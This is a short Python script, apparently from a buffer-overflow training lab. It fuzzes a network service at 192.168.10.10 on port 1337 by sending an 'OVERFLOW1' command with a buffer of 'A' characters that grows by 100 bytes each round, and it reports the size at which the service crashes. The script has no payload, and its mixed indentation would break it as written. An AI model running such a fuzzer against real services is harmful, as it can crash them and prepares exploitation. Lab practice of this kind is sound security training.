#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
        try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.10.10',1337))
        	print("Sending: %s" % str(len(buffer)))
                s.send(("OVERFLOW1 " + buffer))
                s.close()
                sleep(6)
                buffer = buffer + "A" * 100

        except:
                print("Crushed at %s bytes" % str(len(buffer)))
                sys.exit()
